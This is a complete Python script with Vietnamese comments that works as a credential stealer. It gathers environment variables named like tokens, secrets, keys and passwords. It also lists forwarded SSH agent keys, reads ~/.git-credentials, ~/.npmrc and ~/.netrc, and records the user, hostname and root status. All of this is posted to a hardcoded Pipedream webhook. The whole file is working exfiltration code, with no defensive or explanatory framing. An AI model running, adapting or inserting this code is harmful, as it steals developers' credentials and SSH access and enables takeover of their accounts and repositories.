import os
import subprocess
import requests
import json
import socket

# --- CẤU HÌNH ---
PIPEDREAM_URL = "https://eo4ki1jx09tq9fi.m.pipedream.net"

def get_secrets():
    secrets = {}
    # Lấy toàn bộ biến môi trường nhạy cảm
    for key, value in os.environ.items():
        if any(keyword in key.upper() for keyword in ["TOKEN", "SECRET", "KEY", "AUTH", "PASSWORD", "GITHUB"]):
            secrets[key] = value
    return secrets

def get_ssh_agent_info():
    ssh_data = {"socket": os.environ.get("SSH_AUTH_SOCK", "None"), "keys": "None"}
    if ssh_data["socket"] != "None":
        try:
            # Thử liệt kê SSH Keys đang được forward
            result = subprocess.check_output(["ssh-add", "-l"], stderr=subprocess.STDOUT).decode()
            ssh_data["keys"] = result
        except Exception as e:
            ssh_data["keys"] = f"Error: {str(e)}"
    return ssh_data

def get_file_content(path):
    full_path = os.path.expanduser(path)
    if os.path.exists(full_path):
        try:
            with open(full_path, 'r') as f:
                return f.read(500) # Chỉ lấy 500 ký tự đầu để tránh quá tải
        except:
            return "Permission Denied"
    return "Not Found"

def main():
    payload = {
        "metadata": {
            "user": os.getlogin() if hasattr(os, 'getlogin') else "unknown",
            "hostname": socket.gethostname(),
            "is_root": os.getuid() == 0
        },
        "ssh_agent": get_ssh_agent_info(),
        "environment_secrets": get_secrets(),
        "files": {
            "git_credentials": get_file_content("~/.git-credentials"),
            "npmrc": get_file_content("~/.npmrc"),
            "netrc": get_file_content("~/.netrc")
        }
    }

    # Gửi dữ liệu về Pipedream cho sếp
    try:
        response = requests.post(PIPEDREAM_URL, json=payload, timeout=10)
        print(f"[+] Data sent to Pipedream. Status: {response.status_code}")
    except Exception as e:
        print(f"[-] Failed to send data: {e}")

if __name__ == "__main__":
    main()